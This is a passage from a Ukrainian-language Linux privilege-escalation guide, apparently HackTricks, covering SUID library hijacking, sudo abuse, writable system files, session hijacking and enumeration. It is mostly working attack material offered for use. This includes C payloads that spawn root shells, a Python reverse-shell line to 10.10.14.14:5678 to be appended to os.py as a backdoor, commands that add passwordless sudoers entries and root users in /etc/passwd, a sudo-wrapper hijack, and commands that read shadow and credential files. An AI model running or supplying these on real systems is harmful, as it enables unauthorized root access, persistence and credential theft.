Скомпілюйте наведений вище C-файл у shared object-файл (.so) за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Зрештою, запуск уразливого SUID binary має активувати exploit, що потенційно може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує library з папки, до якої ми маємо право запису, створімо library у цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, наприклад
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами бібліотека повинна містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це добірний список Unix-бінарників, які зловмисник може використати для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — це те саме, але для випадків, коли ви можете **лише впроваджувати аргументи** в команду.

Проєкт містить легітимні функції Unix-бінарників, якими можна зловживати для виходу з обмежених оболонок, підвищення або збереження привілеїв, передавання файлів, запуску bind- і reverse-shell, а також виконання інших post-exploitation завдань.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо у вас є доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знайде він спосіб експлуатації будь-якого правила sudo.

### Повторне використання Sudo Tokens

У випадках, коли у вас є **доступ до sudo**, але немає пароля, ви можете підвищити привілеї, **дочекавшись виконання команди sudo, а потім перехопивши токен сесії**.

Вимоги для підвищення привілеїв:

- Ви вже маєте shell від імені користувача "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось протягом **останніх 15 хвилин** (за замовчуванням це тривалість дії sudo token, яка дозволяє використовувати `sudo` без повторного введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви маєте змогу завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або назавжди змінити `/etc/sysctl.d/10-ptrace.conf`, встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконано, **ви можете підвищити привілеї за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Перший exploit** (`exploit.sh`) створить бінарний файл `activate_sudo_token` у _/tmp_. Ви можете використати його, щоб **активувати sudo token у своїй сесії** (root shell не буде запущено автоматично, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Другий exploit** (`exploit_v2.sh`) створить shell sh у _/tmp_, **власником якого є root і для якого встановлено setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Третій експлойт** (`exploit_v3.sh`) **створить файл sudoers**, який робить **токени sudo безстроковими та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** до папки або будь-якого зі створених у ній файлів, ви можете використати binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **отримати sudo privileges**, не знаючи пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як саме. Ці файли **за замовчуванням можуть бути прочитані лише користувачем root і групою root**.\
**Якщо** ви можете **прочитати** цей файл, то зможете **отримати певну цікаву інформацію**, а якщо ви можете **записувати** в будь-який файл, то зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є право на запис, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживання цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують альтернативи бінарному файлу `sudo`, як-от `doas` для OpenBSD. Не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Якщо `doas` дозволяє використовувати редактор або інтерпретатор, перевірте обходи у стилі GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини та використовує `sudo`** для підвищення привілеїв, і ви отримали shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконає ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб під час виконання користувачем sudo запускався ваш виконуваний файл sudo.

Зверніть увагу: якщо користувач використовує інший shell (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або виконання чогось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться завантажені файли конфігурації**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші папки**, у яких будуть **здійснюватися пошуки** **бібліотек**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з певної причини **користувач має права на запис** до будь-якого із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якого файлу всередині `/etc/ld.so.conf.d/` або будь-якої папки, вказаної у файлі конфігурації всередині `/etc/ld.so.conf.d/*.conf`, він може отримати можливість підвищити привілеї.\
Перегляньте **як експлуатувати цю помилку конфігурації** на наступній сторінці:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши lib до `/var/tmp/flag15/`, ви змусите програму використовувати її в цьому місці, як зазначено у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть шкідливу бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають **процесу підмножину доступних привілеїв root**. Це фактично розділяє root **привілеї на менші й окремі одиниці**. Кожна з цих одиниць може незалежно надаватися процесам. Таким чином, повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Перегляньте наступну сторінку, щоб **дізнатися більше про capabilities і способи їхнього зловживання**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Права доступу до директорій

У директорії **біт "execute"** означає, що відповідний користувач може виконати "**cd**" до цієї папки.\
Біт **"read"** означає, що користувач може **перелічувати** **файли**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACL

Access Control Lists (ACL) представляють додатковий рівень дискреційних дозволів, здатний **перевизначати традиційні дозволи ugo/rwx**. Ці дозволи розширюють контроль над доступом до файлів або директорій, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не входять до групи. Такий рівень **деталізації забезпечує точніше керування доступом**. Додаткові відомості наведено [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" права на читання та запис для файлу:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли із певними ACL у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Прихований ACL backdoor у drop-in-файлах sudoers

Поширена помилкова конфігурація — файл у `/etc/sudoers.d/`, що належить root і має режим `440`, але все одно надає користувачу з низькими привілеями доступ на запис через ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати правило sudo, попри обмежувальні біти режиму:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Це високоефективний шлях persistence/privesc через ACL, який легко пропустити під час перевірок лише за допомогою `ls -l`.

## Відкриті shell-сесії

У **старих версіях** ви можете **hijack** деякі **shell**-сесії іншого користувача (**root**).\
У **найновіших версіях** ви зможете **connect** до screen-сесій лише власного користувача. Однак ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![викрадення screen-сесій - Розташування сокетів (деякі системи надають один із них як символічне посилання на інший): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Підключення до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Перехоплення сесій tmux

Це було проблемою **старих версій tmux**. Мені не вдалося перехопити сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Перелік сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Розташування socket (деякі системи надають один як symlink іншого) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Перелік із використанням цього socket, можна запустити tmux session у цьому socket...](<../../images/image (837).png>)

**Підключитися до session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH keys, згенеровані в системах на базі Debian (Ubuntu, Kubuntu тощо) у період із вересня 2006 року до 13 травня 2008 року, можуть бути вразливими до цієї помилки.\
Ця помилка виникає під час створення нового ssh key у таких ОС, оскільки **було можливе лише 32 768 варіантів**. Це означає, що всі можливі варіанти можна обчислити, і **маючи ssh public key, можна знайти відповідний private key**. Обчислені варіанти можна знайти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Цікаві значення конфігурації SSH

- **PasswordAuthentication:** визначає, чи дозволена password authentication. Значення за замовчуванням — `no`.
- **PubkeyAuthentication:** визначає, чи дозволена public key authentication. Значення за замовчуванням — `yes`.
- **PermitEmptyPasswords**: коли password authentication дозволена, визначає, чи дозволяє сервер вхід до облікових записів із порожніми паролями. Значення за замовчуванням — `no`.

### Файли контролю входу

Ці файли визначають, хто може увійти в систему та яким чином:

- **`/etc/nologin`**: якщо присутній, блокує вхід для не-root користувачів і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує місця, звідки root може увійти в систему (список дозволених TTY).
- **`/etc/motd`**: банер після входу (може leak відомості про середовище або технічне обслуговування).

### PermitRootLogin

Визначає, чи може root увійти через ssh; значення за замовчуванням — `no`. Можливі значення:

- `yes`: root може увійти за допомогою пароля та private key
- `without-password` або `prohibit-password`: root може увійти лише за допомогою private key
- `forced-commands-only`: Root може увійти лише за допомогою private key і лише якщо вказано параметри commands
- `no` : ні

### AuthorizedKeysFile

Визначає файли, що містять public keys, які можуть використовуватися для user authentication. Він може містити tokens, наприклад `%h`, які буде замінено на home directory. **Можна вказати absolute paths** (що починаються з `/`) або **relative paths від home directory користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вказуватиме, що якщо ви спробуєте увійти за допомогою **приватного** ключа користувача "**testusername**", ssh порівняє відкритий ключ вашого ключа з ключами, розташованими в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дає змогу **використовувати локальні SSH-ключі замість того, щоб залишати ключі** (без passphrase!) на сервері. Таким чином, ви зможете **підключитися** через ssh **до хоста**, а звідти **підключитися до іншого** хоста, **використовуючи** **ключ**, розташований на вашому **початковому хості**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` має значення `*`, щоразу, коли користувач переходить на іншу машину, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати ці параметри** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти або забороняти** пересилання ssh-agent за допомогою ключового слова `AllowAgentForwarding` (типове значення — allow).

Якщо ви виявили, що Forward Agent налаштовано в середовищі, прочитайте наведену нижче сторінку, оскільки **ви можете скористатися цим для підвищення привілеїв**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` і файли в `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Отже, якщо ви можете **записувати або змінювати будь-який із них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь дивний profile script, слід перевірити його на наявність **sensitive details**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` і `/etc/shadow` можуть мати іншу назву, або може існувати резервна копія. Тому рекомендується **знайти всі такі файли** і **перевірити, чи можете ви їх прочитати**, щоб з'ясувати, **чи містяться в них хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або його аналозі) можна знайти **хеші паролів**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Записуваний /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наведених нижче команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і додайте згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер можна використовувати команду `su` з `hacker:hacker`

Альтернативно можна використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може знизити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` і `/etc/master.passwd`, а `/etc/shadow` перейменований на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записувати в якийсь **файл конфігурації service**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінювати файл конфігурації служби Tomcat у /etc/systemd/,** тоді ви можете змінити такі рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано під час наступного запуску tomcat.

### Перевірка директорій

У наведених нижче директоріях можуть міститися резервні копії або цікава інформація: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Файли в незвичних місцях/із незвичним власником
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли баз даних Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще одним цікавим інструментом**, який можна для цього використовувати, є [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — open source застосунок, призначений для отримання великої кількості паролів, збережених на локальному комп’ютері з Windows, Linux і Mac.

### Логи

Якщо ви можете читати логи, то, можливо, зможете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивнішим є лог, тим цікавішим він, імовірно, буде.\
Крім того, деякі неправильно налаштовані (із backdoor?) **audit logs** можуть дозволити вам **записувати паролі** в audit logs, як пояснюється в цьому дописі: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати журнали, група** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Файли оболонки
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Також слід перевірити файли, що містять слово "**password**" у **назві** або всередині **вмісту**, а також перевірити наявність IP-адрес і email-адрес у логах або хешів за допомогою регулярних виразів.\
Я не буду тут перелічувати, як виконати все це, але якщо вас це цікавить, можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python-скрипт і **можете записувати всередину** цієї папки або **змінювати python-бібліотеки**, ви можете змінити бібліотеку ОС і додати до неї backdoor (якщо ви можете записувати в папку, де виконуватиметься python-скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **додати backdoor до бібліотеки**, просто додайте в кінці бібліотеки os.py наведений нижче рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Вразливість у `logrotate` дає користувачам із **правами на запис** до файлу журналу або його батьківських директорій потенційну можливість отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює від імені **root**, можна змусити виконувати довільні файли, особливо в таких директоріях, як _**/etc/bash_completion.d/**_. Важливо перевіряти дозволи не лише в _/var/log_, а й у будь-якій директорії, для якої застосовується ротація журналів.

> [!TIP]
> Ця вразливість впливає на `logrotate` версії `3.18.0` і старіші

Докладнішу інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю вразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(журнали nginx),** тому щоразу, коли ви виявляєте можливість змінювати журнали, перевіряйте, хто ними керує, і чи можете ви підвищити привілеї, замінивши журнали на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з будь-якої причини користувач може **записувати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **змінити** наявний, тоді ваша **system is pwned**.

Network scripts, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають так само, як файли .INI. Однак у Linux Network Manager (dispatcher.d) їх ~підключає через source~.

У моєму випадку атрибут `NAME=` у цих network scripts обробляється некоректно. Якщо в імені є **пробіл, система намагається виконати частину після пробілу**. Це означає, що **все після першого пробілу виконується від імені root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd і rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він містить скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання, розташовані в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов'язаний з **Upstart**, новішою **системою керування сервісами**, представленою Ubuntu, яка використовує конфігураційні файли для завдань керування сервісами. Попри перехід на Upstart, скрипти SysVinit і надалі використовуються разом із конфігураціями Upstart завдяки шару сумісності в Upstart.

**systemd** — це сучасний менеджер ініціалізації та сервісів, що пропонує розширені функції, як-от запуск daemon за вимогою, керування automount і створення знімків стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та в `/etc/systemd/system/` для змін адміністратора, спрощуючи процес адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Вихід із restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай підключаються до syscall, щоб надати userspace manager доступ до привілейованої функціональності kernel. Слабка автентифікація manager (наприклад, перевірки підпису на основі порядку FD або ненадійні схеми паролів) може дозволити локальному застосунку видати себе за manager і отримати root на пристроях, які вже мають root-доступ. Докладніше про це та експлуатацію можна дізнатися тут:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) через regex-based exec (CVE-2025-41244)

Regex-driven service discovery у VMware Tools/Aria Operations може витягувати шлях до binary з командних рядків процесів і виконувати його з параметром -v у привілейованому контексті. Надто permissive patterns (наприклад, із використанням \S) можуть збігатися з attacker-staged listeners у writable locations (наприклад, /tmp/httpd), що призводить до виконання від імені root (CWE-426 Untrusted Search Path).

Докладніше та узагальнений pattern, застосовний до інших discovery/monitoring stacks, наведено тут:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий tool для пошуку векторів локального privilege escalation у Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(опція -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелік kernel vulns у Linux і MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Збірка додаткових скриптів**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

